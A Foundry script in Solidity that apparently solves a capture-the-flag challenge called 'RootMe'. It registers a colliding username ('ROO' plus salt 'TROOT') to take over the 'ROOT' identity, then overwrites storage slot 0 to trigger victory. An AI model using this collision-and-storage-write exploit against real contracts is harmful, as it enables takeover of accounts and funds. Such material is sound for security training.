// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
interface IRootMe {
    function accountByIdentifier(bytes32) external view returns (address);

    function register(string memory username, string memory salt) external;

    function usernames(string memory) external view returns (bool);

    function victory() external view returns (bool);

    function write(bytes32 storageSlot, bytes32 data) external;
}
contract RootMeScript is Script {
    IRootMe rootMe;
    address player = 0xae22f26D5ddfE22d24aA28AEB1D44c962c673438;
    function setUp() public {
        rootMe = IRootMe(0x38bf311882da6f5f0CB278ae0d5Bd9BD7A9727De);
    }
    function run() public {
        attack();
    }
    function attack() public {
        vm.startBroadcast(player);
        // vm.startPrank(player, player);
        rootMe.register("ROO", "TROOT");

        console.log("Victory =", rootMe.victory());

        rootMe.write(bytes32(uint256(0)), bytes32(uint256(1)));

        console.log("Victory =", rootMe.victory());   
    }
}
